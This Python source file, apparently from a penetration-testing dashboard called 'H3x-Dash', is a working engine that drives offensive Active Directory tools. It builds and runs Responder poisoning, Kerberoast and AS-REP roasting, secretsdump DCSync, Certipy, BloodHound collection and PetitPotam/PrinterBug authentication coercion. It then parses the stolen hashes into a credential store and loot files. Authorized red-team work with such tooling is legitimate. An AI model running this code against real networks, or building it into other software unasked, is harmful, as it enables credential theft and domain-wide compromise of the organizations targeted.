#!/usr/bin/env python3
"""
H3x-Dash — Active Directory / Credential-Access Engine.

Orchestration wrappers around the *real*, operator-installed AD toolkit —
Responder, Impacket (GetUserSPNs / GetNPUsers / secretsdump / ntlmrelayx),
Certipy, BloodHound-python, and the PetitPotam / PrinterBug coercion primitives.
Nothing offensive is bundled here: the engine shells out to tools the operator
already has on their Kali box, streams their output, and parses the results
back into the credential store, loot files, and findings. If a tool isn't on
PATH the run refuses rather than pretending.

Credential context is sourced **exclusively from the captured credential store**
(operator picks a cred by id) — there is no free-text secret entry surface here.

Design mirrors emulation_engine: pure, unit-testable seams
(``build_*_argv`` + ``parse_*``) so the integration is verifiable without the
tools installed, plus a small concurrent job registry (Responder is a
long-running listener; the rest are one-shot).
"""

import json
import re
import shutil
import subprocess
import threading
import uuid
from datetime import datetime, timezone
from pathlib import Path

try:
    from modules.credentials import parse_hashdump_output, HASH_TYPES
except Exception:                                    # pragma: no cover
    from credentials import parse_hashdump_output, HASH_TYPES  # type: ignore


def _now_iso() -> str:
    return datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S+0000')


# ── Tool resolution ───────────────────────────────────────────────────────────
# logical name -> candidate executables (Kali ships impacket both as classic
# `GetUserSPNs.py` and as the `impacket-getuserspns` shim; accept either).
TOOL_CANDIDATES = {
    'responder':    ['responder', 'Responder.py', 'Responder'],
    'ntlmrelayx':   ['ntlmrelayx.py', 'impacket-ntlmrelayx'],
    'getuserspns':  ['GetUserSPNs.py', 'impacket-getuserspns'],
    'getnpusers':   ['GetNPUsers.py', 'impacket-getnpusers'],
    'secretsdump':  ['secretsdump.py', 'impacket-secretsdump'],
    'certipy':      ['certipy', 'certipy-ad'],
    'bloodhound':   ['bloodhound-python', 'bloodhound.py'],
    'netexec':      ['netexec', 'nxc', 'crackmapexec', 'cme'],
    'evil-winrm':   ['evil-winrm'],
    'petitpotam':   ['petitpotam.py', 'PetitPotam.py', 'petitpotam'],
    'printerbug':   ['printerbug.py', 'dementor.py'],
    'hashcat':      ['hashcat'],
}

# Which logical tool each pane action needs, and whether a captured cred is
# mandatory (Responder/coercion don't authenticate).
ACTION_TOOL = {
    'responder':   ('responder',   False),
    'roast':       ('getuserspns', True),   # also uses getnpusers for AS-REP
    'secretsdump': ('secretsdump', True),
    'certipy':     ('certipy',     True),
    'bloodhound':  ('bloodhound',  True),
    'coercion':    ('petitpotam',  False),
}


# ═══════════════════════════════════════════════════════════════════════════
#  PURE HELPERS — credential shaping + argv builders (unit-testable)
# ═══════════════════════════════════════════════════════════════════════════

def norm_hashes(value: str) -> str:
    """Normalise an NTLM cred value to the LM:NT form impacket's -hashes wants."""
    v = (value or '').strip()
    if ':' in v:
        return v
    return ':' + v            # NT-only → :NT


def cred_identity(cred: dict) -> dict:
    """Extract {domain,user,secret,is_hash} from a stored cred dict."""
    return {
        'domain': (cred.get('domain') or '').strip(),
        'user':   (cred.get('username') or '').strip(),
        'secret': cred.get('value') or '',
        'is_hash': cred.get('type') in HASH_TYPES,
    }


def _auth_impacket_target(cred: dict, host: str) -> tuple[str, list]:
    """`domain/user@host` (+ -hashes) for hash creds, else `domain/user:pass@host`."""
    idn = cred_identity(cred)
    userpart = (idn['domain'] + '/' if idn['domain'] else '') + idn['user']
    if idn['is_hash']:
        return f'{userpart}@{host}', ['-hashes', norm_hashes(idn['secret'])]
    return f'{userpart}:{idn["secret"]}@{host}', []


def build_roast_argv(exe: str, cred: dict, dc_ip: str, out_file: str,
                     mode: str = 'kerberoast') -> list:
    """GetUserSPNs (kerberoast) / GetNPUsers (AS-REP) argv."""
    idn = cred_identity(cred)
    userpart = (idn['domain'] + '/' if idn['domain'] else '') + idn['user']
    argv = [exe]
    if idn['is_hash']:
        argv += [userpart, '-hashes', norm_hashes(idn['secret'])]
    else:
        argv += [f'{userpart}:{idn["secret"]}']
    argv += ['-dc-ip', dc_ip, '-request', '-outputfile', out_file]
    return argv


def build_asrep_argv(exe: str, cred: dict, dc_ip: str, out_file: str) -> list:
    idn = cred_identity(cred)
    userpart = (idn['domain'] + '/' if idn['domain'] else '') + idn['user']
    argv = [exe]
    if idn['is_hash']:
        argv += [userpart, '-hashes', norm_hashes(idn['secret'])]
    else:
        argv += [f'{userpart}:{idn["secret"]}']
    argv += ['-dc-ip', dc_ip, '-request', '-outputfile', out_file]
    return argv


def build_secretsdump_argv(exe: str, cred: dict, target: str,
                           just_dc: bool = True) -> list:
    tgt, extra = _auth_impacket_target(cred, target)
    argv = [exe, tgt] + extra
    if just_dc:
        argv += ['-just-dc-ntlm']       # DCSync, NTLM only — less noisy than full
    return argv


def build_certipy_argv(exe: str, cred: dict, dc_ip: str, out_stem: str,
                       vulnerable_only: bool = True) -> list:
    idn = cred_identity(cred)
    upn = idn['user'] + ('@' + idn['domain'] if idn['domain'] else '')
    argv = [exe, 'find', '-u', upn, '-dc-ip', dc_ip, '-output', out_stem]
    if idn['is_hash']:
        argv += ['-hashes', norm_hashes(idn['secret'])]
    else:
        argv += ['-p', idn['secret']]
    if vulnerable_only:
        argv += ['-vulnerable']
    return argv


def build_bloodhound_argv(exe: str, cred: dict, dc_host: str,
                          collection: str = 'All') -> list:
    idn = cred_identity(cred)
    argv = [exe, '-u', idn['user'], '-d', idn['domain'] or '',
            '-dc', dc_host, '-c', collection, '--zip']
    if idn['is_hash']:
        argv += ['--hashes', norm_hashes(idn['secret'])]
    else:
        argv += ['-p', idn['secret']]
    return argv


def build_coercion_argv(exe: str, listener_ip: str, target_ip: str,
                        cred: dict | None = None, method: str = 'petitpotam') -> list:
    """PetitPotam / PrinterBug: force `target_ip` to authenticate to `listener_ip`."""
    argv = [exe]
    if cred:
        idn = cred_identity(cred)
        argv += ['-u', idn['user'], '-d', idn['domain'] or '']
        if idn['is_hash']:
            argv += ['-hashes', norm_hashes(idn['secret'])]
        else:
            argv += ['-p', idn['secret']]
    argv += [listener_ip, target_ip]
    return argv


def build_responder_argv(exe: str, iface: str, analyze: bool = False) -> list:
    argv = [exe, '-I', iface, '-wv']
    if analyze:
        argv += ['-A']                  # passive analyze — no poisoning
    return argv


# ═══════════════════════════════════════════════════════════════════════════
#  PURE PARSERS — extract loot from tool stdout (unit-testable)
# ═══════════════════════════════════════════════════════════════════════════

_KRB_TGS = re.compile(r'\$krb5tgs\$\S+')
_KRB_ASREP = re.compile(r'\$krb5asrep\$\S+')
_NETNTLM = re.compile(r'NTLMv2-SSP Hash\s*:\s*(\S+::\S+)')
_NETNTLM_USER = re.compile(r'NTLMv2-SSP Username\s*:\s*(\S+)')
_ESC = re.compile(r'\bESC(\d{1,2})\b')
_BH_ZIP = re.compile(r'(?:Compressing|written to|output into)\D*([^\s\'"]+\.zip)', re.I)


def parse_kerberoast(text: str) -> list[dict]:
    """Return [{'username','hash','kind':'kerberoast'}] from GetUserSPNs output."""
    out = []
    for m in _KRB_TGS.finditer(text or ''):
        h = m.group(0)
        # $krb5tgs$23$*user$REALM$... → user is between the first '*' and next '$'
        um = re.search(r'\$krb5tgs\$\d+\$\*([^$*]+)', h)
        out.append({'username': um.group(1) if um else '', 'hash': h, 'kind': 'kerberoast'})
    return out


def parse_asrep(text: str) -> list[dict]:
    out = []
    for m in _KRB_ASREP.finditer(text or ''):
        h = m.group(0)
        um = re.search(r'\$krb5asrep\$\d+\$([^@]+)@', h)
        out.append({'username': um.group(1) if um else '', 'hash': h, 'kind': 'asrep'})
    return out


def parse_netntlm(text: str) -> list[dict]:
    """Return [{'username','domain','hash'}] captured NetNTLMv2 from Responder."""
    out = []
    for line in (text or '').splitlines():
        m = _NETNTLM.search(line)
        if m:
            blob = m.group(1)
            parts = blob.split('::')
            user = parts[0] if parts else ''
            dom = parts[1].split(':')[0] if len(parts) > 1 else ''
            out.append({'username': user, 'domain': dom, 'hash': blob})
    return out


def parse_certipy(text: str) -> list[dict]:
    """Return [{'esc','detail'}] ADCS misconfig findings from certipy stdout."""
    out = []
    seen = set()
    for line in (text or '').splitlines():
        for m in _ESC.finditer(line):
            esc = 'ESC' + m.group(1)
            key = (esc, line.strip())
            if key in seen:
                continue
            seen.add(key)
            out.append({'esc': esc, 'detail': line.strip()[:300]})
    return out


def parse_bloodhound_zip(text: str) -> str | None:
    m = _BH_ZIP.search(text or '')
    return m.group(1) if m else None


def parse_coercion(text: str) -> dict:
    t = (text or '')
    if re.search(r'success', t, re.I) and not re.search(r'unsuccess', t, re.I):
        return {'coerced': True, 'detail': 'target authenticated to listener'}
    if re.search(r'rpc_s_access_denied|STATUS_ACCESS_DENIED|ERROR_BAD_NETPATH', t):
        return {'coerced': False, 'detail': 'access denied / path unreachable'}
    return {'coerced': None, 'detail': 'no clear success marker — review output'}


# ═══════════════════════════════════════════════════════════════════════════
#  ENGINE
# ═══════════════════════════════════════════════════════════════════════════

class AdEngine:
    def __init__(self, cred_store, loot_dir):
        self.creds = cred_store
        self.loot_dir = Path(loot_dir) / 'ad'
        self.loot_dir.mkdir(parents=True, exist_ok=True)
        self._jobs: dict[str, dict] = {}
        self._findings: list[dict] = []
        self._lock = threading.Lock()

    # ── availability ─────────────────────────────────────────────────────────
    def _which(self, logical: str) -> str | None:
        for exe in TOOL_CANDIDATES.get(logical, []):
            p = shutil.which(exe)
            if p:
                return p
        return None

    def tool_status(self) -> dict:
        out = {}
        for logical in TOOL_CANDIDATES:
            p = self._which(logical)
            out[logical] = {'available': bool(p), 'path': p}
        return out

    def action_available(self, action: str) -> tuple[bool, str, str | None]:
        logical, _ = ACTION_TOOL.get(action, (None, False))
        if not logical:
            return False, f'unknown action {action}', None
        path = self._which(logical)
        if not path:
            cands = ', '.join(TOOL_CANDIDATES[logical])
            return False, f'{logical} not on PATH (looked for: {cands})', None
        return True, 'ready', path

    # ── credential resolution (captured store only) ──────────────────────────
    def resolve_cred(self, cred_id: str) -> dict | None:
        if not cred_id:
            return None
        for c in self.creds.list():
            if c.get('id') == cred_id:
                return c
        return None

    # ── findings ─────────────────────────────────────────────────────────────
    def _add_finding(self, host_ip, tool, ftype, severity, title, detail='', cve=None):
        f = {'host_ip': host_ip, 'tool': tool, 'type': ftype, 'severity': severity,
             'title': title, 'detail': detail, 'cve': cve, 'timestamp': _now_iso()}
        with self._lock:
            self._findings.append(f)
        return f

    def findings(self):
        with self._lock:
            return list(self._findings)

    def loot_files(self):
        out = []
        for p in sorted(self.loot_dir.glob('*')):
            if p.is_file():
                out.append({'filename': p.name, 'size': p.stat().st_size,
                            'created': datetime.fromtimestamp(p.stat().st_mtime).strftime('%Y-%m-%d %H:%M')})
        return out

    # ── job registry ─────────────────────────────────────────────────────────
    def running(self, client_id: str) -> bool:
        with self._lock:
            j = self._jobs.get(client_id)
            return bool(j and j.get('proc') and j['proc'].poll() is None)

    def stop(self, client_id: str) -> bool:
        with self._lock:
            j = self._jobs.get(client_id)
        if j and j.get('proc') and j['proc'].poll() is None:
            try:
                j['proc'].terminate()
            except Exception:
                pass
            return True
        return False

    def _spawn(self, client_id, argv, on_output, on_complete, *,
               parser=None, cwd=None, long_running=False):
        """Run argv, stream stdout, invoke parser(full_text) at exit."""
        def worker():
            buf = []
            try:
                on_output(f'[►] exec: {" ".join(argv)}')
                proc = subprocess.Popen(argv, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True,
                                        bufsize=1, cwd=cwd)
            except FileNotFoundError:
                on_output(f'[!] executable not found: {argv[0]}')
                on_complete({'status': 'error', 'error': 'not found'})
                return
            with self._lock:
                self._jobs[client_id] = {'proc': proc, 'argv': argv}
            try:
                for line in iter(proc.stdout.readline, ''):
                    line = line.rstrip('\n')
                    if line.strip():
                        buf.append(line)
                        on_output('    ' + line)
                        if parser and long_running:
                            # stream-parse for daemons (Responder) as lines arrive
                            try:
                                parser('\n'.join(buf[-6:]), on_output, streaming=True)
                            except TypeError:
                                pass
                proc.stdout.close()
            finally:
                rc = proc.wait()
            result = {'status': 'ok', 'return_code': rc}
            if parser:
                try:
                    parsed = parser('\n'.join(buf), on_output, streaming=False) \
                        if long_running else parser('\n'.join(buf))
                    if isinstance(parsed, dict):
                        result.update(parsed)
                except Exception as exc:
                    on_output(f'[~] parse error: {exc}')
            on_complete(result)

        t = threading.Thread(target=worker, daemon=True)
        t.start()
        return True

    # ── per-action entry points ──────────────────────────────────────────────
    def start(self, action, spec, on_output, on_complete) -> tuple[bool, str]:
        ok, detail, exe = self.action_available(action)
        if not ok:
            on_output(f'[!] {action}: {detail}. Refusing to run.')
            return False, detail

        cred_id = spec.get('cred_id')
        _, need_cred = ACTION_TOOL[action]
        cred = self.resolve_cred(cred_id) if cred_id else None
        if need_cred and not cred:
            on_output('[!] No captured credential selected — capture or add one in Loot first.')
            return False, 'credential required'

        client_id = spec.get('client_id')
        dispatch = getattr(self, f'_do_{action}')
        return dispatch(client_id, exe, cred, spec, on_output, on_complete)

    def _do_roast(self, cid, exe, cred, spec, on_output, on_complete):
        dc = spec.get('dc_ip') or ''
        mode = spec.get('mode', 'kerberoast')
        stem = f'{mode}_{uuid.uuid4().hex[:6]}.txt'
        out_file = str(self.loot_dir / stem)
        argv = build_roast_argv(exe, cred, dc, out_file, mode)

        def parser(text):
            hashes = parse_asrep(text) if mode == 'asrep' else parse_kerberoast(text)
            try:
                Path(out_file).parent.mkdir(parents=True, exist_ok=True)
                Path(out_file).write_text('\n'.join(h['hash'] for h in hashes))
            except Exception:
                pass
            for h in hashes:
                self._add_finding(dc, mode, 'ad_roast', 'HIGH',
                                  f'{mode} hash for {h["username"] or "account"}',
                                  'crackable offline — hashcat', None)
            on_output(f'[✓] {len(hashes)} {mode} hash(es) → {stem}')
            return {'results': hashes, 'loot_file': stem, 'count': len(hashes)}
        return cid_ok(self._spawn(cid, argv, on_output, on_complete, parser=parser)), 'started'

    def _do_secretsdump(self, cid, exe, cred, spec, on_output, on_complete):
        target = spec.get('dc_ip') or spec.get('target') or ''
        argv = build_secretsdump_argv(exe, cred, target,
                                      just_dc=spec.get('just_dc', True))

        def parser(text):
            captured = parse_hashdump_output(text, host_ip=target, source_tool='secretsdump')
            stored = 0
            for c in captured:
                try:
                    self.creds.add(c); stored += 1
                except Exception:
                    pass
            if captured:
                self._add_finding(target, 'secretsdump', 'ad_dcsync', 'CRITICAL',
                                  f'{len(captured)} NTLM hash(es) extracted (DCSync)',
                                  'domain hashes recovered', None)
            on_output(f'[✓] {stored} NTLM hash(es) → credential store')
            return {'results': captured, 'count': stored}
        return cid_ok(self._spawn(cid, argv, on_output, on_complete, parser=parser)), 'started'

    def _do_certipy(self, cid, exe, cred, spec, on_output, on_complete):
        dc = spec.get('dc_ip') or ''
        stem = str(self.loot_dir / f'certipy_{uuid.uuid4().hex[:6]}')
        argv = build_certipy_argv(exe, cred, dc, stem,
                                  vulnerable_only=spec.get('vulnerable_only', True))

        def parser(text):
            escs = parse_certipy(text)
            for e in escs:
                self._add_finding(dc, 'certipy', 'ad_adcs', 'HIGH',
                                  f'ADCS {e["esc"]} misconfiguration', e['detail'], None)
            on_output(f'[✓] {len(escs)} ADCS finding(s)')
            return {'results': escs, 'count': len(escs)}
        return cid_ok(self._spawn(cid, argv, on_output, on_complete, parser=parser)), 'started'

    def _do_bloodhound(self, cid, exe, cred, spec, on_output, on_complete):
        dc = spec.get('dc_ip') or spec.get('dc_host') or ''
        argv = build_bloodhound_argv(exe, cred, dc,
                                     collection=spec.get('collection', 'All'))

        def parser(text):
            zipname = parse_bloodhound_zip(text)
            if zipname:
                self._add_finding(dc, 'bloodhound', 'ad_graph', 'INFO',
                                  'BloodHound collection complete',
                                  f'graph data: {zipname}', None)
            on_output(f'[✓] collection complete{" → " + zipname if zipname else ""}')
            return {'loot_file': zipname, 'count': 1 if zipname else 0}
        # run in the loot dir so the zip lands there
        return cid_ok(self._spawn(cid, argv, on_output, on_complete,
                                  parser=parser, cwd=str(self.loot_dir))), 'started'

    def _do_coercion(self, cid, exe, cred, spec, on_output, on_complete):
        listener = spec.get('listener_ip') or ''
        target = spec.get('target_ip') or spec.get('dc_ip') or ''
        argv = build_coercion_argv(exe, listener, target, cred,
                                   method=spec.get('method', 'petitpotam'))

        def parser(text):
            verdict = parse_coercion(text)
            sev = 'HIGH' if verdict.get('coerced') else 'INFO'
            self._add_finding(target, 'coercion', 'ad_coercion', sev,
                              f'Auth coercion ({spec.get("method","petitpotam")})',
                              verdict['detail'], None)
            on_output(f'[✓] coercion: {verdict["detail"]}')
            return {'results': [verdict]}
        return cid_ok(self._spawn(cid, argv, on_output, on_complete, parser=parser)), 'started'

    def _do_responder(self, cid, exe, cred, spec, on_output, on_complete):
        iface = spec.get('iface') or 'eth0'
        argv = build_responder_argv(exe, iface, analyze=spec.get('analyze', False))
        loot = self.loot_dir / f'responder_{uuid.uuid4().hex[:6]}.txt'
        captured_users = set()

        def parser(text, out=None, streaming=False):
            caps = parse_netntlm(text)
            new = []
            for c in caps:
                key = c['username'] + '::' + c['hash'][:24]
                if key in captured_users:
                    continue
                captured_users.add(key); new.append(c)
            if new:
                try:
                    with open(loot, 'a') as fh:
                        for c in new:
                            fh.write(c['hash'] + '\n')
                except Exception:
                    pass
                for c in new:
                    self._add_finding(None, 'responder', 'ad_netntlm', 'HIGH',
                                      f'Captured NetNTLMv2 for {c["username"]}',
                                      'crackable / relayable', None)
                    if out:
                        out(f'  [+] captured NetNTLMv2 :: {c["username"]}')
            if streaming:
                return None
            return {'results': list(captured_users), 'loot_file': loot.name,
                    'count': len(captured_users)}
        return cid_ok(self._spawn(cid, argv, on_output, on_complete,
                                  parser=parser, long_running=True)), 'started'


def cid_ok(v) -> bool:
    return bool(v)
